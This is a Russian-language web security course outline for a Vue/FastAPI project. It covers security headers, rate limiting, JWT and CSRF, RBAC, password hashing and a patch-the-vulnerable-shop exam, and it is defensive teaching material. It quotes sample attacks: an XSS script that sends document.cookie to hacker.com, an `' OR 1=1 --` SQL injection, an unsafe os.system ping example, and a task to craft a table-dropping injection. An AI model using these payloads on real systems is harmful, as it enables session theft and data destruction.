# 🛡️ Security во VueExpert: от уязвимостей к защитам (Урок в формате MASTER_PROMPT)

### Контекст (Сюжет)
В баг‑репортах всплывают XSS и утечки токенов. Нужен минимум обязательных защит: XSS, Secrets, JWT/CSRF и Rate Limiting.

### 1. Техническое Задание (ТЗ)
- Файлы: `backend/app/main.py`, `backend/app/security.py`
- Задача: добавить CSP и Security Headers, внедрить Rate Limiter на Redis, хранить Refresh Token в HttpOnly Cookie, исключить опасный v-html на фронте.
- Условия: соблюсти CORS для 5173/4173, добавить SameSite для cookie.

### 2. Референс (Visual/Logic Target)
- Заголовки: `Content-Security-Policy`, `Strict-Transport-Security`, `X-Content-Type-Options`
- `/products` кэшируется, лимит >10/мин даёт 429

### 3. Теория (Just-in-Time)
- Авто‑эскейпинг Vue и риски v-html
- JWT в памяти + Refresh в HttpOnly Cookie (и CSRF меры)

### 4. Практика (Interactive Steps)
Фрагменты к доработке:
```py
# app/main.py (headers)
@app.middleware("http")
async def security_headers(request, call_next):
    resp = await call_next(request)
    resp.headers["Content-Security-Policy"] = "default-src 'self'"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    return resp
```
```py
# app/middleware.py (rate limit)
async def rate_limiter(request, call_next):
    # ___FILL___: ключ по IP, INCR, EXPIRE, 429
```
Фронт: убрать `v-html` для пользовательских данных или санитайзить DOMPurify.

### 5. Чек-лист Самопроверки (Verification)
- [ ] CSP заголовок задан
- [ ] HttpOnly + SameSite для Refresh Token
- [ ] Rate Limiter выдаёт 429 при >10/мин
- [ ] Нет небезопасного `v-html`

### 6. Возможные ошибки (Troubleshooting)
- CSP ломает ассеты → разреши нужные источники
- Не задал SameSite → уязвимость к CSRF
- Лимитер блокирует всех → ключ должен включать IP/путь

### 7. Решение (Spoiler)
<details>
<summary>Показать эталон</summary>

```py
@app.middleware("http")
async def security_headers(request, call_next):
    resp = await call_next(request)
    resp.headers["Content-Security-Policy"] = "default-src 'self'"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    return resp
```
</details>

---

Вот подробная структура курса по **Security (Безопасность)** для проекта **VueExpert**.
> См. правила оценки: [MODULE_ASSESSMENT.md](./MODULE_ASSESSMENT.md)


В современном вебе безопасность — это не "фича", которую можно добавить в конце. Это фундамент.

### CORS (в связке с фронтендом)
- Разрешайте только нужные источники. В проекте по умолчанию: http://localhost:5173 и http://localhost:4173
- Не используйте `*` вместе с `credentials`
- Для Nuxt/других хостов добавляйте явно (например, http://localhost:3000)

### CSP (базовая)
- На проде добавляйте Content‑Security‑Policy (default-src 'self') и постепенно расширяйте под нужды
- В Dev допустимы более мягкие правила, но лучше привыкать к строгой политике раннее

Наша философия: **«Чтобы защитить приложение, ты должен уметь его взломать»**. Мы учим писать код так, чтобы даже при желании выстрелить себе в ногу, фреймворк бил по рукам.

---

# 🛡️ Security во VueExpert: Крепость Кода

Курс разделен на две части:
1.  **Basic:** Гигиена кода. Защита от самых популярных уязвимостей (OWASP Top 10 начального уровня): Хардкод секретов, Инъекции, XSS и Хранение паролей.
2.  **Advanced:** Архитектурная защита. JWT, сессии, CORS/CSRF, Rate Limiting и Ролевая модель доступа (RBAC). **Гарант уровня Middle.**

---

## 🟢 ЧАСТЬ 1. BASIC: Гигиена и Санитария
*Цель: Не допустить детских ошибок, из-за которых угоняют базы данных и админки.*

### 🔑 Модуль S1. Управление секретами (Secrets)
**Метафора:** "Ключ под ковриком".
*   **1.1. Проблема Хардкода:**
    *   Почему `SECRET_KEY = "my_secret"` в репозитории — это мгновенная смерть проекта.
    *   История утечек (как боты сканируют GitHub за секунды).
*   **1.2. Environment Variables (.env):**
    *   Библиотека `pydantic-settings`.
    *   Валидация конфигурации: Приложение не должно запускаться, если нет пароля от БД.
    *   `.gitignore`: Как убедиться, что `.env` никогда не улетит в коммит.

### 💉 Модуль S2. Инъекции (Injection)
**Контекст:** Работа с БД.
*   **2.1. SQL Injection:**
    *   *Взлом:* Вводим в поле логина `' OR 1=1 --`.
    *   *Механика:* Как интерпретатор базы видит склеенную строку.
    *   *Защита:* Почему использование ORM (SQLAlchemy) и параметризованных запросов решает проблему на 100%.
*   **2.2. Command Injection:**
    *   Почему нельзя делать `os.system(f"ping {user_input}")`.

### 🦠 Модуль S3. Cross-Site Scripting (XSS)
**Контекст:** Фронтенд Vue.
*   **3.1. Stored XSS:**
    *   Злоумышленник пишет комментарий: `<script>fetch('http://hacker.com?cookie='+document.cookie)</script>`.
    *   *Демо:* Браузер жертвы выполняет код и отправляет сессию хакеру.
*   **3.2. Vue Auto-escaping:**
    *   Почему `{{ message }}` безопасно (превращает `<` в `&lt;`).
*   **3.3. Опасная зона `v-html`:**
    *   Когда он нужен (рендеринг статей) и как его санитайзить (библиотека `DOMPurify`).

### 🔐 Модуль S4. Пароли и Хеширование
*   **4.1. Plain Text:**
    *   Почему хранить пароли в открытом виде — преступление.
*   **4.2. Хеширование (Hashing):**
    *   Отличие шифрования (обратимо) от хеширования (необратимо).
    *   Алгоритмы: Почему MD5 и SHA1 мертвы. Использование `bcrypt` или `argon2`.
*   **4.3. Соль (Salt):**
    *   Защита от радужных таблиц (Rainbow Tables). Почему у двух юзеров с паролем `123456` должны быть разные хеши.

---

## 🔴 ЧАСТЬ 2. ADVANCED: Архитектура Защиты (Middle Grade)
*Цель: Построить систему, устойчивую к умным атакам, перехвату сессий и DDoS.*

### 🎫 Модуль SA1. JWT и Сессии
**Контекст:** Авторизация в SPA.
*   **1.1. Анатомия JWT:**
    *   Header, Payload, Signature.
    *   Почему нельзя хранить конфиденциальные данные в Payload (он просто Base64-encoded).
*   **1.2. Место хранения (Storage Wars):**
    *   **LocalStorage:** Удобно, но уязвимо к XSS (JS может прочитать токен).
    *   **HttpOnly Cookie:** Недоступно для JS (защита от XSS), но уязвимо к CSRF.
    *   *Best Practice:* Access Token (короткий) в памяти/JS, Refresh Token (длинный) в HttpOnly Cookie.

### 🎭 Модуль SA2. CSRF (Подделка запросов)
*   **2.1. Механика атаки:**
    *   Жертва заходит на `evil-site.com`, а там скрытая форма, которая отправляет POST-запрос на `bank.com/transfer`. Браузер сам подставляет куки банка.
*   **2.2. Защита:**
    *   SameSite Cookie attribute (`Strict` / `Lax`).
    *   CSRF Tokens (Double Submit Cookie паттерн).

### 👮‍♂️ Модуль SA3. Контроль доступа (RBAC)
**Контекст:** Админка магазина.
*   **3.1. Authentication vs Authorization:**
    *   "Кто ты?" vs "Что тебе можно?".
*   **3.2. Role-Based Access Control:**
    *   Создание декоратора/зависимости в FastAPI: `Depends(require_role("admin"))`.
    *   Защита на уровне роутов (Бэк) и скрытие кнопок (Фронт).
    *   *Важно:* Скрытие кнопки на фронте — это UI/UX, а не безопасность. Проверка на бэке обязательна.

### 🚦 Модуль SA4. Rate Limiting (Защита от DDoS)
**Контекст:** Брутфорс паролей и парсинг каталога.
*   **4.1. Throttling:**
    *   Ограничение: "Не больше 5 попыток входа в минуту с одного IP".
*   **4.2. Реализация:**
    *   Связка **Redis + FastAPI**. Алгоритм "Token Bucket" или "Fixed Window".
    *   Библиотека `fastapi-limiter`.

### 🛡️ Модуль SA5. Заголовки и HTTPS
*   **5.1. MITM (Man-in-the-Middle):**
    *   Почему HTTP трафик можно читать в кафе через Wi-Fi. Роль HTTPS (TLS).
*   **5.2. Security Headers (Helmet):**
    *   **HSTS:** Заставляем браузер использовать только HTTPS.
    *   **CSP (Content Security Policy):** Запрещаем загрузку скриптов с левых доменов (убийца XSS).
    *   **X-Content-Type-Options:** Защита от подмены MIME-типов.

### 📦 Модуль SA6. Безопасность зависимостей (Supply Chain)
*   **6.1. Проблема:**
    *   "Я пишу безопасный код, но подключил библиотеку, которую взломали".
*   **6.2. Аудит:**
    *   Python: `pip-audit`, `safety`.
    *   JS: `npm audit`.
    *   Как читать отчеты об уязвимостях (CVE).

### 🏆 Финальный экзамен Security (Penetration Testing)
**Задание:** Провести аудит и "запатчить" уязвимое приложение.

**Сценарий:**
Тебе выдается ветка `feature/vulnerable-shop`.
1.  **XSS:** В отзывах к товару можно вставить картинку с `onerror`. -> *Исправить:* Заменить `v-html` на интерполяцию или подключить санитайзер.
2.  **Broken Auth:** Токен живет 365 дней и не инвалидируется при смене пароля. -> *Исправить:* Уменьшить TTL, добавить черный список токенов в Redis.
3.  **IDOR (Insecure Direct Object Reference):** Пользователь может посмотреть чужой заказ, поменяв ID в URL (`/orders/5` -> `/orders/6`). -> *Исправить:* Добавить проверку `if order.user_id != current_user.id: raise 403`.
4.  **Mass Assignment:** Можно стать админом, отправив `{"is_admin": true}` при обновлении профиля. -> *Исправить:* Использовать Pydantic схемы `UserUpdate`, где исключено поле `is_admin`.

---

### Интерактивные фишки в Учебнике

1.  **The "SQLi" Playground:**
    *   Поле ввода "Поиск товара".
    *   Задача: Ввести такой запрос, чтобы удалилась таблица `users`.
    *   Визуализация: Показываем, как строка превращается в `DELETE FROM ...`.

2.  **XSS Ping-Pong:**
    *   Два окна: "Атакующий" и "Жертва".
    *   Атакующий пишет скрипт.
    *   Если скрипт срабатывает, экран жертвы краснеет.
    *   Задача студента: Включить CSP заголовок, чтобы экран перестал краснеть.

3.  **JWT Decoder:**
    *   Студент вставляет свой токен.
    *   Учебник декодирует его и подсвечивает красным дату `exp` (истечение), если она > 1 часа.
    *   "Твой токен живет вечность. Если его украдут, ты не сможешь отозвать доступ."

4.  **Permisison Matrix:**
    *   Таблица Ролей (User, Editor, Admin) и Ресурсов (Create, Read, Delete).
    *   Студент расставляет галочки.
    *   Учебник генерирует Python-декораторы на основе этой матрицы.

## Оценка и проверка

- Квиз (теория)
  - Формат: 10-20 вопросов (JSON/YAML/Markdown‑банк).
  - Порог прохождения: ≥ 80% правильных ответов.
- Практика (код/задачи)
  - Репо‑ориентированные задания (вносятся в текущий проект).
  - Проверка: unit/integration/e2e тестами.
- Автопроверка (CI)
  - Фронт: Vitest (+ покрытие), линтеры (ESLint/Prettier).
  - Бэк: Pytest (httpx.AsyncClient), линтеры (ruff/flake8), покрытие.
  - E2E: Playwright (PW_BASE_URL).
- Рубрика
  - S (90–100): тесты зелёные, покрытие на уровне, стиль чистый, без smell‑ов.
  - A (80–89), B (70–79), C (<70) — по убыванию: недочёты/покрытие/падающие проверки.
- Remediation
  - Список провалов (из отчёта CI) → ссылки на соответствующие разделы учебника.
